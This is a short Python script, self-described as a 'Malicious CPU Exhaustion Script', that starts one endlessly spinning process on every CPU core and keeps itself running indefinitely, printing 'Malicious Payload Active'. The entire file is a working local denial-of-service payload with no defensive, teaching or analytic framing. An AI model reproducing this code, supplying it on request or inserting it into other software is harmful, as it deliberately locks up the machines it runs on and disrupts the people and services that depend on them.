# Malicious CPU Exhaustion Script
# This script consumes all CPU cores using multiprocessing

import multiprocessing
import time

def cpu_exhaustion():
    # Infinite loop to occupy CPU
    while True:
        pass

if __name__ == "__main__":
    cores = multiprocessing.cpu_count()
    print(f"Malicious Payload Active. Detected {cores} cores.")

    # Spawn process on each core
    for _ in range(cores):
        p = multiprocessing.Process(target=cpu_exhaustion)
        p.daemon = True
        p.start()

    # Keep main process alive
    while True:
        time.sleep(1)
